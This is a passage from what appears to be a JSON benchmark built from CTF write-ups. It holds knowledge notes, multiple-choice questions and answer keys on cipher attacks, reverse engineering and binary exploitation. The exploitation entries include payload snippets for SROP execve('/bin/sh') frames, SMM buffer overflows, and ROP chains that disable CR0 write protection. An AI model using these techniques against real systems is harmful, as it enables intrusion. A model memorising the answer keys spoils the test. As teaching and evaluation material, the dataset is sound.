            "In a cryptographic challenge involving substitution-permutation networks (SPN) with the square property, by crafting a set of plaintexts where all entries are identical except for a single byte, and then encrypting these plaintexts, one can leverage the square property to simplify the process of cracking the encryption. This approach works because if you encrypt 256 plaintexts that differ in only one position, the output ciphertexts for that position will cycle through every possible byte value. This method is particularly useful when attempting to reverse engineer or break down the encryption process in stages, such as identifying the last XOR key applied in an SPN encryption scheme.",
            "When trying to determine the value of unknown bytes in a cryptographic key or to reverse an encryption process where multiple potential values are identified for each byte, interleave analyses on different datasets. This can be done by encrypting sets of plaintexts that have been padded with different characters, generating candidates for the unknown key bytes from each set. Then, intersect the sets of candidate values generated from each dataset. The logic is that the actual byte value will consistently appear in all candidate sets, while incorrect values will vary and thus can be filtered out. This method is effective in scenarios where an encryption mechanism generates many false positives in the process of key recovery. \n\nExample of generating and filtering candidates:\n```python\ndef integrate(index, ciphertexts, invsbox):\n    potential = set()\n    for candidateByte in range(256):\n        sum = 0\n        for ct in ciphertexts:\n            t = ct[index] ^ candidateByte # invert xor\n            s = invsbox[t] # invert sbox\n            sum ^= s\n        if sum == 0:\n            potential.add(candidateByte)\n    return potential\n\n# Assuming the invsbox (inverse S-box) and ciphertexts have been defined elsewhere\ncandidates_each_byte = [integrate(i, ciphertexts, invsbox) for i in range(8)]\n# Further processing to filter and determine the correct byte values\n```\nThis approach narrows down the search for the correct byte values in cryptographic key recovery efforts, making it feasible to dissect complex encryption mechanisms in a stepwise and efficient manner."
        ],
        "question": [
            "In the context of a cryptographic challenge using substitution-permutation networks (SPN) and leveraging the square property, how does encrypting 256 plaintexts that differ only at one byte position help in breaking down the encryption process? - A. It confirms the encryption is based on a linear cipher algorithm. - B. It ensures that the output ciphertexts cycle through every possible byte value at the modified position. - C. It reduces the overall complexity of the encryption algorithm to a single round. - D. It increases the randomness of the output ciphertext, making cryptanalysis more challenging. ",
            "When confronted with multiple potential values for each byte in a cryptographic key recovery effort, what strategy is recommended to narrow down to the correct byte values using ciphertexts generated from differently padded plaintext sets? - A. Apply a brute-force attack using all possible byte combinations. - B. Encrypt additional plaintexts without padding and compare the ciphertexts. - C. Intersect the sets of candidate byte values obtained from each dataset, filtering out incorrect values. - D. Increase the number of encryption rounds to eliminate false positives. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Simple XOR",
        "write_up": "dataset/raw/Simple XOR.md",
        "type": "crypto",
        "competition": [
            "UrchinSec/2024",
            "https://ctftime.org/event/2327/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "In challenges involving simple XOR encryption, if the key is a single character, one can decrypt the message by XORing the encrypted data with the key. This is because XOR encryption is reversible using the same key. Here, 'a' (ASCII 97) is used as the key. To manually decrypt without the original key, you can brute-force the key by trying all possible character values (typically in the range of printable ASCII characters) until the decrypted text makes sense.\n   \n   Example for manual decryption without original key (pseudo-code):\n   ```python\n   encrypted_hex = \"0c0b1a111017...\"  # The encrypted data in hex format.\n   encrypted_bytes = bytes.fromhex(encrypted_hex)\n   for key_candidate in range(256):  # Trying all byte values as potential keys.\n       decrypted = ''.join(chr(byte ^ key_candidate) for byte in encrypted_bytes)\n       if \"flag_format_here\" in decrypted:  # Assuming you know the flag format.\n           print(f'Found with key {key_candidate}:', decrypted)\n           break\n   ```",
            "When working with XOR encryption in a CTF challenge, and if a specific part of the plaintext is known (e.g., the flag format 'urchinsec{'), you can use this known plaintext to recover the key, assuming the key is short and reused for encryption. This process is known as a known-plaintext attack (KPT). In the given case, since the key is just one character, XORing the known part of the plaintext with the corresponding part of the ciphertext will directly give you the key.\n\n   Example for finding the key with known plaintext:\n   ```python\n   known_plaintext = \"urchinsec{\"\n   encrypted_hex = \"0c0b1a111017...\"  # The start of the encrypted data in hex.\n   encrypted_bytes = bytes.fromhex(encrypted_hex)\n   key = ord(known_plaintext[0]) ^ encrypted_bytes[0]  # Using the first character for simplicity.\n   print(f\"Recovered key: {chr(key)}\")\n   ```"
        ],
        "question": [
            "In a challenge involving simple XOR encryption with a known plaintext 'urchinsec{' at the beginning, decryption of the encrypted data without the original single-character key can be approached by trying all possible character values until the decrypted text reveals the flag format. Given the encrypted data in hex format '0c0b1a111017...', which is the best method to manually decrypt the data to retrieve the flag?  - A. Convert the encrypted data directly to ASCII and search for readable text. - B. Perform a XOR operation between each character in the encrypted data and 'urchinsec{' directly. - C. Iterate over all byte values (0-255) as potential keys, XORing the encrypted data with each, and check if the flag format appears in decrypted output. - D. Reverse the encryption process by applying a Caesar cipher shift with a common shift value. ",
            "During XOR encryption analysis in a CTF challenge, when the flag format 'urchinsec{' is known to be at the start of a plaintext message which has been encrypted with a single-character key, how can the encryption key be recovered using a known-plaintext attack (KPT)?  - A. Apply a base64 decoding on both the plaintext and the ciphertext, then compare outputs. - B. Use the length of the known plaintext to deduce the encryption key through frequency analysis. - C. XOR the first character of the known plaintext 'u' with the first byte of the ciphertext to directly recover the single-character key. - D. Calculate the MD5 hash of the known plaintext and the corresponding part of the ciphertext to find the key. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Skipping the Ropes",
        "write_up": "dataset/raw/Skipping the Ropes.md",
        "type": "crypto",
        "competition": [
            "eHaCON/2021",
            "https://ctftime.org/event/1494/tasks/"
        ],
        "score": 25,
        "max_score": 125,
        "difficulty": 0.2,
        "knowledge": [
            "When faced with an encoded file or message in a CTF challenge and suspecting a Caesar cipher, one can decode it using ROT13 or other Caesar shifts if the ROT13 attempt does not reveal readable text. ROT13 is a special case of the Caesar cipher which shifts letters by 13 places in the alphabet. Online tools such as CyberChef or dcode.fr can be utilized for quick decryption without the need to write custom scripts.",
            "The choice of ROT13 or any specific shift, like in the challenge \"Skipping the Ropes\", should be based on hints within the challenge description or file names that suggest a relationship with Caesar or the ROT cipher family. This strategy reduces the time spent on trial and error across numerous possible encryption methods by targeting a likely encryption technique based on the context provided.\n\nExample payload for ROT13: Using online tool CyberChef or dcode.fr, input `RUNPBA{3AP0Q3Q_J1GU_E0G}` to receive `EHACON{3NC0D3D_W1TH_R0T}` as the output."
        ],
        "question": [
            "When attempting to decode a message that is suspected to be encrypted using a Caesar cipher, which online tool could be directly used to apply a ROT13 decryption without writing any custom code? - A. Google Translate - B. CyberChef - C. Microsoft Excel - D. Adobe Photoshop",
            "If you encounter a file named \"cipher.txt\" in a CTF challenge with encrypted content hinting at Caesar or ROT encrypting methods, what initial decryption attempt should you consider based on contextual hints? - A. Attempt an MD5 hash decryption - B. Use a ROT13 decryption attempt - C. Decode using Base64 - D. Apply an AES decryption algorithm"
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Skywriting v2",
        "write_up": "dataset/raw/Skywriting v2.md",
        "type": "The type of this CTF challenge is crypto.",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": 460,
        "max_score": 500,
        "difficulty": 0.92,
        "knowledge": [
            "In challenges involving encrypted content, if the encryption method involves XOR and the flag format is known (e.g., starting with a known pattern), an effective starting point is to XOR the known character of the flag with the corresponding encrypted character. This can provide the key needed to begin decrypting the flag. Example approach: If the flag format starts with 'h' and the encrypted content starts with '.', XOR these two ('.' ^ 'h') to find the key for initial decryption steps.",
            "When partial decryption reveals part of the flag correctly but other parts are still encrypted, it indicates a multiple XOR key encryption might be involved. In such scenarios, identifying parts of the decrypted content that are expected to conform to a known pattern (e.g., common words or flag format segments) can help determine additional XOR keys. This involves guessing the plain text for a segment, XORing the guessed character with the decrypted character at the corresponding position to find the new key, and applying it to subsequent characters. Example adjustment: If decryption reveals \"iTs_sUpl[\" and the guess for the next character is 'e', XOR the decrypted character 'l' with 'e' to find the next XOR key, then continue decryption."
        ],
        "question": [
            "In a cryptography challenge where the encrypted flag is suspected to be xored with a key, if the known flag format begins with 'h' and the encrypted message starts with '.', which of the following actions could help in starting the decryption process? - A.XOR the ASCII values of 'h' and '.' to deduce the encryption key. - B.Add the ASCII values of 'h' and '.' and use the sum as the encryption key. - C.Subtract the ASCII value of 'h' from '.' and use the difference as the encryption key. - D.Directly replace '.' with 'h' in the encrypted message assuming a simple substitution cipher.",
            "If during the decryption of a XOR encrypted flag, after partially decrypting the message, it's observed that the decrypted part matches the expected pattern of the flag up to a point (e.g., \"iTs_sUpl[\" with the next expected character being 'e'), which of the following options best describes the next step? - A.Use the partially decrypted message as a new key to XOR the remaining encrypted message. - B.Identify the next encrypted character ('l' in this case), guess the expected decrypted character ('e'), XOR these to deduce a new key, and apply it to subsequent characters. - C.Attempt to reverse engineer the encryption algorithm based on the partially decrypted content. - D.Ignore the partially decrypted message and start over with a different encryption method assumption."
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "Slicense",
        "write_up": "dataset/raw/Slicense.md",
        "type": "web",
        "competition": [
            "KipodAfterFree/2019",
            "https://ctftime.org/event/945/tasks/"
        ],
        "score": 60,
        "max_score": 100,
        "difficulty": 0.6,
        "knowledge": [
            "When analyzing reverse engineering challenges involving apps, especially those with a GUI component, jadx can be used for disassembly to locate relevant code segments easily, such as function calls and string references that interact with the UI. This is particularly useful for identifying areas of interest, like JavaScript interfaces or specific functions that validate input.",
            "In challenges that involve encryption, specifically AES/CBC with no padding, static keys or initialization vectors (IVs) can sometimes be identified through dynamic analysis tools like Frida by hooking into encryption and decryption functions. Once the static key and IV are known, decryption of values processed by the app can be performed to reveal hidden messages or inputs necessary for challenge completion.\n   \n   Example static IV or key: `F00Bar?!F00Bar?!`"
        ],
        "question": [
            "When reverse engineering an application to understand its functionality, which tool is commonly used for disassembling the app to find code segments related to the graphical user interface and input validation logic? - A. Wireshark - B. GDB - C. JADX - D. Metasploit",
            "When dealing with an encryption scheme like AES in Cipher Block Chaining (CBC) mode with no padding in a cybersecurity challenge, what approach can be utilized to uncover the static key or Initialization Vector (IV) for decrypting confidential information? - A. Utilizing antivirus software to scan for cryptographic vulnerabilities - B. Employing dynamic analysis tools like Frida to hook into encryption and decryption functions - C. Applying static code analysis to automatically extract keys from binaries - D. Using network sniffers to intercept encryption keys during transmission"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Slide To The Left",
        "write_up": "dataset/raw/Slide To The Left.md",
        "type": "crypto",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 350,
        "max_score": 500,
        "difficulty": 0.7,
        "knowledge": [
            "When dealing with AES-CBC encryption, a padding oracle attack allows for decrypting the ciphertext without needing the encryption key. This attack manipulates the initialization vector (IV) and observes the decryption outputs to infer back the original plaintext. This technique leverages the fact that changes in the IV will affect the decryption of the first block of ciphertext in a predictable way, enabling an attacker to guess the plaintext by observing error messages or changes in output.",
            "For executing a successful padding oracle attack in challenges involving AES-CBC, it is crucial to interact with an oracle that provides detailed feedback (errors, success messages) on decryption attempts. This feedback, when the decryption process involves incorrect padding, helps in adjusting the attack payloads (IV and ciphertext) to correctly guess the plaintext byte by byte. An important condition for the success of such attacks is the presence of detailed error messages or distinguishable outputs based on the padding correctness.\n   \nExample Payload Adjustment for IV (Initialization Vector):\n```python\noriginal_iv = b'\\x94\\xd0g\\xa3e\\xb5\\x1d\\xa0X\\x9f\\x8b\\xa2\\xeeg\\xfd\\xd6'\nadjusted_iv = bytearray(original_iv)\n# Adjust individual bytes of the IV here based on oracle feedback\nadjusted_iv[0] = adjusted_iv[0] ^ 0x01 # Example adjustment based on feedback\n```"
        ],
        "question": [
            "In a Capture The Flag challenge involving AES-CBC encryption, how does modifying the Initialization Vector (IV) impact the decryption process in the context of a padding oracle attack? - A. Modifying the IV converts the ciphertext to plaintext without requiring the encryption key. - B. Changes in the IV do not influence the decryption process and are only used for increasing randomness in encryption. - C. Modifications to the IV directly decrypt the ciphertext by bypassing encryption algorithms. - D. Altering the IV affects the decryption of the first block of ciphertext in a predictable manner, facilitating the inference of the plaintext.",
            "In challenges that utilize AES-CBC encryption, under which condition is a padding oracle attack most likely to succeed? - A. When the encryption service limits the number of decryption attempts. - B. When detailed feedback on the correctness of padding in decryption attempts is provided. - C. When the oracle does not provide any feedback on decryption attempts. - D. When using a static IV for all encryption and decryption operations."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Slots",
        "write_up": "dataset/raw/Slots.md",
        "type": "reverse",
        "competition": [
            "KITCTFCTF/2022",
            "https://ctftime.org/event/1810/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing a binary for vulnerabilities or specific behaviors, starting from a point of interest such as a function that interacts with a critical file (e.g., reading a \"flag.txt\") can be effective. This approach involves backtracking from the point of interest to understand the conditions and logic that lead to its execution. Developers can utilize this strategy to identify the critical code paths that need to be addressed or manipulated for exploitation or debugging.",
            "For challenges that involve predicting or influencing pseudo-random number generation, identifying the seed initialization function such as `srand()` is crucial. Once identified, an attacker can attempt to control or predict the output of `rand()` by manipulating the seed. This can often be achieved through bruteforcing or reverse engineering the seed generation logic. In cases where direct manipulation is complex or impossible, using symbolic execution tools like Z3 can be a powerful technique to solve for the necessary input values to achieve the desired state or output. This approach is particularly useful in challenges where inputs are obfuscated or transformed in non-trivial ways before affecting the program's state.\n\nExample payload when manipulating `srand()` for predictable `rand()` output:\n```cpp\nunsigned int target_seed = 0; // Assume you've calculated the correct seed.\nsrand(target_seed);\nint predictable_rand = rand(); // This call to rand() will now produce a predictable result.\n```"
        ],
        "question": [
            "When reverse engineering a binary to find the logic that leads to the execution of a function reading a critical file, which of the following is the best initial step? - A. Starting with analyzing the binary's entry point and statically checking each function's call graph. - B. Instantly decompile the entire binary to source code and manually reading through for hints. - C. Randomly picking functions to analyze based on their names hoping they might give a clue. - D. Directly modifying binary code to bypass all security measures without analysis.",
            "In a challenge related to pseudo-random number generation, which method allows for a predictable output from `rand()` by directly influencing its behavior? - A. Redefining the `rand()` function to always return a fixed value. - B. Executing `rand()` multiple times until it produces the desired output. - C. Setting the seed with `srand()` to a known value for predictable `rand()` output. - D. Using an external tool to replace the `rand()` output in memory during runtime."
        ],
        "answer": [
            "A.",
            "C."
        ]
    },
    {
        "name": "Slowest Fastest",
        "write_up": "dataset/raw/Slowest Fastest.md",
        "type": "pwn",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with a dynamic programming problem, particularly one that requires optimizing certain actions (like allocating tasks to different types of workers to minimize time), using numpy for mathematical operations and array manipulations can significantly enhance performance. This approach is particularly beneficial in scenarios where you need to process large datasets or perform complex calculations under time constraints.",
            "In scenarios where you have to deal with a slow connection or a tight time limit for sending responses (like the 60 seconds in this challenge), precomputing as much as possible before entering the main interaction loop can be crucial. Specifically, calculating the sequence of actions or operations beforehand and then quickly iterating through them to generate the required output for each step or test case. This method ensures that your solution remains within the time limit while dealing with interactive problems.\n\nExample payload (conceptual, related to optimization and pre-computation strategies, not directly applicable as a command):\n```python\nroomsGifts = [v1]  \nfor x in range(1,N):  \n    giftsForRoom = (a * roomsGifts[-1] + c) % mod  \n    roomsGifts.append(giftsForRoom)\nroomsGifts = -np.sort(-np.array(roomsGifts))\n```"
        ],
        "question": [
            "In a challenge that involves optimizing a gift-building process among different factory rooms with unique conditions for gift generation per room, which Python library feature aids in effective array manipulation for sorting the number of gifts in descending order to allocate tasks to workers efficiently? - A. Using the `math` library for direct numerical computations - B. Utilizing `list.sort()` method for in-place sorting - C. Using `-np.sort(-np.array())` from the `numpy` library for descending sort - D. Applying the `collections.Counter` for counting element occurrences",
            "Given a CTF challenge where the connection to the server hosting the challenge is slow, and there is a stringent 60-second limit to solve and respond to a series of 100 test cases involving the computation of gift distribution among workers in a factory setup, what programming approach is most crucial to ensuring that the solution fits within the allocated time? - A. Implementing recursive functions for dynamic programming problems - B. Sending individual responses as soon as they're computed - C. Precomputing sequences and rapidly iterating through test cases - D. Using multithreading to handle I/O operations"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Small Inscription",
        "write_up": "dataset/raw/Small Inscription.md",
        "type": "crypto",
        "competition": [
            "DanteCTF/2023",
            "https://ctftime.org/event/2000/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When encountering RSA encryption in CTF challenges where the public exponent `e` is notably small (e.g., e=3), a Low Exponent Attack can be applied efficiently. This is because the small exponent makes it feasible to compute the cube root of the ciphertext, potentially directly revealing the plaintext if `pow(m,e) < N`. This method is relevant in scenarios where RSA is used with small public exponents and the encryption does not fully exploit the modulus size.",
            "If the direct cube root of the ciphertext does not yield the plaintext (likely because `pow(m,e) \u2265 N`), the ciphertext `ct` can be adjusted by iteratively adding multiples of the modulus `N` (i.e., calculating the cube root of `ct + kN` for some integer `k`) until the plaintext is recovered. This approach is necessary when the original message, once encrypted, is comparable to or exceeds the modulus in size, a condition often met in practical RSA encryption scenarios. \n\nSample approach to adjust and recover the plaintext:\n\n```python\nfrom gmpy2 import iroot\n\nct = <ciphertext>\nn = <modulus>\nk = 0\n\nwhile True:\n    adjusted_ct = ct + k * n\n    m, is_exact = iroot(adjusted_ct, 3)\n    if is_exact:\n        print(f'Plaintext: {m}')\n        break\n    k += 1\n```\n\nThis snippet represents the concept without specific values, where `<ciphertext>` and `<modulus>` should be replaced with the actual `ct` and `n` values from the challenge."
        ],
        "question": [
            "When handling RSA encryption with a small public exponent such as `e=3`, which method can efficiently decrypt the plaintext if the ciphertext raised to the power of `e` did not exceed the modulus `N`? - A. Conducting a brute-force search on the key space to reverse the encryption - B. Applying the Chinese Remainder Theorem for faster decryption - C. Directly calculating the cube root of the ciphertext to obtain the plaintext - D. Using differential cryptanalysis to reduce the complexity of breaking RSA",
            "In the scenario where encrypted message `pow(m,e)` is greater than or equal to the modulus `N`, necessitating adjustment of the ciphertext `ct` by adding multiples of `N` for successful decryption using Low Exponent Attack in RSA, which of the following represents the correct approach to recover the plaintext? - A. Subtracting a constant from `ct` until a smooth cube root is found - B. Iteratively adding multiples of the modulus `N` to `ct` and attempting to calculate its cube root until the original message is recovered - C. Multiplying `ct` by a fixed integer and then finding the cubic root - D. Dividing `ct` by the modulus `N` until a cube root can be cleanly extracted"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "small_boi",
        "write_up": "dataset/raw/small_boi.md",
        "type": "pwn",
        "competition": [
            "CSAW/2019/Quals",
            "https://ctftime.org/event/870/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "For exploiting binaries with limited instructions and without linked libc, leveraging a syscall to perform a Sigreturn Oriented Programming (SROP) attack can be effective. This technique is applicable particularly when the binary has a `syscall` instruction and a way to control the stack (e.g., through a buffer overflow), allowing for the execution of arbitrary code despite Non-Executable (NX) stack protections. In scenarios where the binary contains a function that initiates a sigreturn syscall (`syscall; ret` pattern), crafting a signal frame on the stack can be utilized to gain control over the program's execution flow. \n\nExample payload component: `sigreturn = p64(0x40017c)  # Address of function initiating sigreturn syscall`",
            "If the binary being exploited contains strings or other data useful for exploitation (e.g., \"/bin/sh\" for spawning a shell), these can be incorporated into the payload to perform system calls, such as `execve`, without the need to find or inject these strings elsewhere. This method is specifically valuable in environments where writing or injecting additional data is constrained or not possible. The presence of such strings within the binary can complement SROP and other exploit techniques by providing necessary arguments for syscalls directly from the binary's memory space.\n\nExample payload component: `frame.rdi = 0x4001ca  # Address of \"/bin/sh\" within the binary`"
        ],
        "question": [
            "In the context of exploiting a buffer overflow in a binary without linked libc and with NX enabled, which of the following payloads is correctly prepared to leverage a Sigreturn Oriented Programming (SROP) attack by using a function initiating a sigreturn syscall found within the binary itself?  - A. `payload += p64(0x400200) + SigreturnFrame()` - B. `payload = \"A\"*0x28 + p64(0x40017c) + str(SigreturnFrame())[8:]` - C. `payload = \"A\"*0x30 + \"B\"*8 + \"C\"*8` - D. `sigreturn = p32(0x40017c) # wrong bitness` ",
            "When constructing a payload for an exploit that involves making a `execve` system call via SROP attack, and the binary already contains the \"/bin/sh\" string at a known address, what would be the correct way to specify the argument for `execve` in the sigreturn frame?  - A. `frame.rsi = 0x4001ca  # Incorrect, rsi should not point to \"/bin/sh\"` - B. `frame.rdi = \"/bin/sh\"  # Incorrect, rdi needs the memory address, not the string itself` - C. `frame.rax = 0x4001ca  # Incorrect, rax is for the syscall number, not the argument` - D. `frame.rdi = 0x4001ca  # Correct, rdi is the first argument to execve, pointing to \"/bin/sh\"` "
        ],
        "answer": [
            "B. `payload = \"A\"*0x28 + p64(0x40017c) + str(SigreturnFrame())[8:]`",
            "D. `frame.rdi = 0x4001ca  # Correct, rdi is the first argument to execve, pointing to \"/bin/sh\"`"
        ]
    },
    {
        "name": "SMM Cowsay 2",
        "write_up": "dataset/raw/SMM Cowsay 2.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In a challenge concerning buffer overflows within a structured data communication handler, specifically in scenarios involving SMM (System Management Mode) with restricted memory access, an overflow can be triggered by sending a payload that exceeds allocated bounds. This overflow can lead to the corruption of adjacent memory data, such as function pointers. This corruption can be leveraged to gain control of the instruction pointer (RIP) and execute arbitrary code. Essential to this approach is ensuring that the payload size precisely matches the overflow requirements to corrupt specific targets, like function pointers, without affecting unrelated memory areas. \n   \n   Example payload structure for triggering the overflow and corrupting a function pointer: \n   ```python\n   payload = 'A'.encode('utf-16-le') * 200 + p64(address_of_controlled_data)\n   ```",
            "For executing a ROP (Return-Oriented Programming) chain in environments where direct memory access might be restricted or specific protections are engaged (like CR0 write protection in SMM), an intermediary gadget can be utilized to adjust the stack pointer (RSP) to a controlled area in memory filled with subsequent ROP gadgets and payloads. This method is especially useful in scenarios where initial exploitation provides limited control over program execution flow or where direct execution of shellcode is not feasible due to memory protection mechanisms. The selection of an initial gadget to adjust the RSP plays a crucial role in ensuring the continuity of the ROP chain execution.\n\n   Example of using an intermediary gadget to adjust RSP for a ROP chain:\n   ```python\n   # Assuming 'ret_0x70' is an address of a gadget 'ret 0x70' that adjusts RSP by adding 0x70 before returning\n   # The gadget's purpose is to move RSP to a controlled area filled with further ROP gadgets\n   payload += p64(ret_0x70)\n   # Followed by the rest of ROP chain placed at the controlled stack area\n   payload += p64(gadget1) + p64(gadget2) + ...\n   ```"
        ],
        "question": [
            "In a scenario where a driver in System Management Mode (SMM) improperly handles the length of a buffer passed through a structured communication channel, leading to a buffer overflow, which of the following exploitation steps is critical for leveraging this overflow to manipulate the instruction pointer (RIP) and achieve code execution? - A. Send random-sized payloads until the system crashes, indicating a successful overflow. - B. Precisely calculate and send a payload that overflows the buffer by exactly the amount needed to overwrite a function pointer or return address in memory. - C. Allocate large payloads in all available memory regions to ensure at least one will cause the desired overflow. - D. Focus exclusively on overflowing numeric variables adjacent to the buffer to cause integer overflows. ",
            "When deploying a Return-Oriented Programming (ROP) chain in a restricted environment, such as one with direct memory access limitations, what technique is pivotal for ensuring the ROP chain's execution when initial control over the execution flow is minimal? - A. Use a sequence of NOP sleds to slide into the controlled area in memory where the ROP chain is located. - B. Execute a brute-force attack to guess addresses of useful ROP gadgets in the executable's memory space. - C. Employ an intermediary gadget that adjusts the stack pointer (RSP) to a memory area under attacker control, filled with subsequent ROP gadgets. - D. Rewrite the entire executable code segment with ROP gadgets to ensure one of them gets executed randomly. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "SMM Cowsay 3",
        "write_up": "dataset/raw/SMM Cowsay 3.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving ASLR (Address Space Layout Randomization) where direct address references are impossible, one can defeat ASLR by leaking addresses through legitimate functionalities provided by the target environment. Particularly, in UEFI environments, identifying and exploiting built-in protocols via functions like `BootServices->LocateProtocol` can be used to leak base addresses of drivers by subtracting known offsets. This approach relies on the presence of unique protocol GUIDs for different drivers, which, when requested, can reveal driver locations indirectly and allow for subsequent address calculations and exploitation. \n\n   Condition: When attacking UEFI firmware with ASLR enabled.\n   \n   Knowledge: Locate registered protocols using their GUIDs to leak driver base addresses, enabling the bypass of ASLR.",
            "In the presence of execution control mechanisms like SMM_CODE_CHK_EN, which prevents execution outside of specific memory ranges (SMRAM), and with ASLR making hardcoded addresses unreliable, ROP (Return Oriented Programming) can be a viable exploitation strategy. This involves utilizing existing code snippets (\"gadgets\") within the allowed memory range to craft a payload that achieves the desired outcome, such as disabling protection mechanisms (e.g., write protection in CR0 register) or injecting and executing shellcode. \n\n   Condition: Attacking firmware with strict execution restrictions (e.g., Secure Boot environments) and protections like DEP (Data Execution Prevention).\n\n   Knowledge: Leverage ROP chains constructed from gadgets found within the permitted execution range to disable protection mechanisms and execute arbitrary code or shellcode. \n\n   Example payload: To disable CR0.WP (write-protect), the ROP chain would need gadgets to pop values into registers (e.g., `pop rax; pop rbx; pop r12; ret`), move the stack pointer (e.g., `ret 0x6d`), and execute the instruction to modify CR0 (e.g., `mov cr0, rax; wbinvd; ret`)."
        ],
        "question": [
            "In a scenario involving UEFI firmware with ASLR, how can an attacker leak the base address of a driver to bypass ASLR? The attacker uses a function to request information on protocols identified by unique GUIDs. Upon finding a protocol implemented by a driver, the attacker can calculate the driver's base address by: - A. Calling `malloc` with the size of the driver and analyzing the returned memory address. - B. Using `BootServices->LocateProtocol` with a driver's GUID to get a pointer to the protocol struct, then subtracting a known offset. - C. Invoking `SystemTable->ConOut->OutputString` with the driver's name to leak its loading address. - D. Broadcasting a special network packet that queries the firmware for loaded drivers and their memory locations. ",
            "When facing an environment where executing code outside specific memory ranges is blocked by mechanisms like `SMM_CODE_CHK_EN` and ASLR is employed, what exploitation technique is effectively utilized to execute arbitrary code? The technique involves leveraging sequences of existing machine instructions in memory, \"gadgets,\" to perform operations like disabling write protection or injecting shellcode. - A. Performing a DMA attack to overwrite the firmware's memory directly. - B. Using a buffer overflow to overwrite the instruction pointer (IP) directly to the shellcode location. - C. Employing ROP chains using gadgets within permitted execution ranges to manipulate processor states or execute shellcode. - D. Flashing the firmware with a modified version that includes the attacker's payload. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Snake Jazz",
        "write_up": "dataset/raw/Snake Jazz.md",
        "type": "crypto",
        "competition": [
            "FE-CTF/2022",
            "https://ctftime.org/event/1776/tasks/"
        ],
        "score": 1,
        "max_score": 1,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with obfuscated code containing custom defined operations and arithmetic, a valuable step is to analyze and modify the custom operators to understand their functionality. This involves examining the provided class methods for unary and binary operations to deduce their purpose and effects. By altering these methods to print variables or process logic in a simpler way, one can uncover the underlying mechanism of the obfuscation or encryption. For instance, adding print statements in methods that are consistently invoked can reveal hidden logic or data flow, aiding in deobfuscating the program.",
            "In challenges involving custom virtual machines or emulated environments, particularly those with obfuscated memory operations, directly analyzing memory access and manipulation functions can be highly effective. This can be done by inserting logging or debugging printouts in the memory access functions (e.g., `mem_get` and `mem_set`) to trace how data is stored, retrieved, and modified. Specifically, transforming and closely observing the program's interaction with its emulated memory can reveal the storage pattern of sensitive data such as flags. To extract and read hidden data, one should consider altering the termination condition of the emulated program so that it does not exit prematurely before revealing the desired information. For example, replacing a termination call (`os._exit(0)`) with a break statement to prevent the program from exiting before the data can be extracted."
        ],
        "question": [
            "In an obfuscated Python challenge, a crucial step involves understanding the purpose and effects of customized operators defined within a class. Consider a class `X` with overwritten special methods for unary and binary operations such as `__add__`, `__sub__`, and `__invert__`. You decide to insert print statements in these methods to trace variables and simplify the logic. This approach aims to reveal the underlying mechanism of the obfuscation. Which of the following modifications to the `__invert__` method would be most helpful for tracing the operation's impact on object `x`'s data without changing the original functionality?  - A. Add `print(\"Inverting value\")` before executing any operation within `__invert__`. - B. Replace the entire body of `__invert__` with `print(x.c)`; return `X(x.a, x.b, 0)`. - C. Incorporate `print(f\"Before invert: a={x.a}, b={x.b}, c={x.c}\")` at the beginning and `print(f\"After invert: a={x.a}, b={x.b}, c={x.c}\")` at the end of `__invert__`. - D. Remove all operations within `__invert__` and replace them with `return X(0,0,0)`. ",
            "In the context of debugging a custom emulated environment, you are analyzing how the emulated machine's memory is manipulated. The machine uses a ternary system, and memory operations are executed through two key methods: `mem_get` and `mem_set`. To trace how sensitive data (such as the flag) is stored or modified, you decide to add debugging output to these methods. What change to the `mem_set` method would be most effective for understanding how a value is written to a specific location in memory without interfering with the original logic of the program?  - A. Insert `print(\"Writing to memory\")` at the beginning of `mem_set`. - B. Replace the entire logic of `mem_set` with `print(index, width, value)` to see the parameters. - C. Add `print(f\"Setting memory at {index} with width {width} to value={value:02x}\")` before modifying `self.b`. - D. Eliminate all operations that modify `self.b` inside `mem_set` and insert `print(\"Memory set operation skipped\")`. "
        ],
        "answer": [
            "C. Incorporate `print(f\"Before invert",
            "C. Add `print(f\"Setting memory at {index} with width {width} to value={value:02x}\")` before modifying `self.b`."
        ]
    },
    {
        "name": "Snake Oil",
        "write_up": "dataset/raw/Snake Oil.md",
        "type": "reverse",
        "competition": [
            "FE-CTF/2022",
            "https://ctftime.org/event/1776/tasks/"
        ],
        "score": 1,
        "max_score": 1,
        "difficulty": 1.0,
        "knowledge": [
